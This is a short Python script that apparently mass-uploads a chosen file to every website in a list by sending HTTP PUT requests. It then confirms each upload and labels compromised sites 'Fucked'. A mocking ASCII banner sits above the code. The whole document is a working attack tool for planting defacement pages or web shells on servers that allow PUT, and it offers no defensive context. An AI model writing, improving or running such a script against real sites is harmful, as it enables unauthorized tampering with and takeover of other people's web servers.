try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("yo install requests...")

banner = """
       .-.                     .-.               
          |U|                     | |               
          | |                     | |               
          | |                     | |               
         _| |_                   _| |_              
        | | | |-.               | |_| |-.           
       /|     ` |              / )| |_|_|           
      | |       |             | |-' `-^-'           
      |         |             |     ||  |           
      \         /             \     '   /           
       |       |               |       |       private tool soo dont use without permission   
       |       |               |       |    
       """

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def aox(script,target_file="listsite.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("Attacking to %d Website."%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code == 200 and requests.get(f"{site}/{script}").text == open(script, "r").read():
               print(m+"["+h+" Fucked"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+b+" Unfucked"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = input("huh?: ")
         if not os.path.isfile(a):
            print("dude there is no file named '%s' "%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
